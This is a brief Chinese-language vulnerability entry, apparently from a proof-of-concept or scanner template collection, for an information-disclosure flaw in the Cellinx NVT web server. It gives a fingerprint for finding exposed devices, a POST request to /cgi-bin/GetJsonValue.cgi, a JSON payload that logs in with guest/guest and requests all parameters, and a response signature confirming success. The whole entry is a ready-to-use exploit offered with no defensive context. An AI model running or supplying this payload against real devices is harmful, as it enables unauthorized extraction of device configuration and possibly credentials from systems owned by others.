# CellinxNVTWebServer信息泄露漏洞

CellinxNVTWebServer ｜ 信息泄露 ｜ —
- **指纹**：`body="local/NVT-string.js"`
- **请求**：`POST /cgi-bin/GetJsonValue.cgi?TYPE=json HTTP/1.1`

**Payload**
```
{"jsonData":{"username":"guest","password":"guest","file":"param","data":"All"}}
```
- **响应特征**：200 ProductCode